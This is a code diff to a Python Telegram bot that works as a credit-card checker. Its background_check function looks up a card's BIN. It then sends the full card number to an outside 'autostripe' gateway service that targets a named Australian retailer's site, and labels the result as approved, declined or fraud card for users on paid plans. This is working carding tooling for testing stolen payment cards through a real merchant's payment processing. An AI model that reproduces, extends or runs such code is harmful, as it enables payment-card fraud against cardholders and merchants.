@@ -1427,16 +1427,10 @@ async def get_bin_details(bin_number: str) -> dict:
         return bin_data
 
 # ✅ Background check now uses live BIN data
-import aiohttp
-from telegram.constants import ParseMode
-from telegram.helpers import escape_markdown as escape_markdown_v2
-
 async def background_check(cc_normalized, parts, user, user_data, processing_msg):
     bullet_text = escape_markdown_v2("[⌇]")
     bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
-
     try:
-        # --- BIN lookup ---
         bin_number = parts[0][:6]
         bin_details = await get_bin_details(bin_number)
         brand = (bin_details.get("scheme") or "N/A").upper()
@@ -1444,23 +1438,18 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         country_name = (bin_details.get("country_name") or "N/A")
         country_flag = bin_details.get("country_emoji", "")
 
-        # --- Main API call ---
-        api_url = (
-            f"https://darkboy-auto-stripe-y6qk.onrender.com/"
-            f"gateway=autostripe/key=darkboy/"
-            f"site=buildersdiscountwarehouse.com.au/"
-            f"cc={cc_normalized}"
-        )
+        # Your main API call
+        api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=45) as resp:
                 if resp.status != 200:
                     raise Exception(f"HTTP {resp.status}")
                 data = await resp.json()
-
         api_status = (data.get("status") or "Unknown").strip()
 
-        # --- Status formatting ---
+        # Status formatting with safe try/except
         try:
+            status_text = api_status.upper()
             lower_status = api_status.lower()
             if "approved" in lower_status:
                 status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
@@ -1482,32 +1471,35 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
                 status_text = "🛑 𝗣𝗜𝗖𝗞𝗨𝗣 𝗖𝗔𝗥𝗗 🛑"
             elif "fraudulent" in lower_status:
                 status_text = "⚠️ 𝗙𝗥𝗔𝗨𝗗 𝗖𝗔𝗥𝗗 ⚠️"
+            elif "generic decline" in lower_status:
+                status_text = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
             else:
-                status_text = api_status.upper()
+                status_text = api_status.upper()  # fallback
         except Exception as e:
             status_text = "❌ ERROR ❌"
             print(f"Status formatting error: {e}")
 
-        # --- Build message ---
+        # Prepare header and italic API status
         header = f"═══\\[ **{escape_markdown_v2(status_text)}** \\]═══"
         formatted_response = f"_{escape_markdown_v2(api_status)}_"
 
+        # Build final message
         final_text = (
             f"{header}\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➜ {escape_markdown_v2(cc_normalized)}\n"
             f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {formatted_response}\n"
             f"――――――――――――――――\n"
-            f"> 𝐁𝐫𝐚𝐧𝐝 ➜ {escape_markdown_v2(brand)}\n"
-            f"> 𝐁𝐚𝐧𝐤 ➜ {escape_markdown_v2(issuer)}\n"
-            f"> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {escape_markdown_v2(country_name)} {country_flag}\n"
+            f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ {escape_markdown_v2(brand)}\n"
+            f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ {escape_markdown_v2(issuer)}\n"
+            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {escape_markdown_v2(country_name)} {country_flag}\n"
             f"――――――――――――――――\n"
             f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {escape_markdown_v2(user.first_name)}\\[{escape_markdown_v2(user_data.get('plan', 'Free'))}\\]\n"
             f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ [kคli liຖนxx](tg://resolve?domain=Deadkiller72)\n"
             f"――――――――――――――――"
         )
 
-        # --- Send message ---
+        # Send the message with MarkdownV2
         try:
             await processing_msg.edit_text(
                 final_text,
@@ -1517,9 +1509,9 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         except Exception as e:
             await processing_msg.edit_text(
                 f"❌ API Error: {escape_markdown_v2(str(e))}",
-                parse_mode=ParseMode.MARKDOWN_V2
+                parse_mode=ParseMode.MARKDOWN_V2,
+                disable_web_page_preview=True
             )
-
     except Exception as e:
         await processing_msg.edit_text(
             f"❌ An error occurred during the check: {escape_markdown_v2(str(e))}",
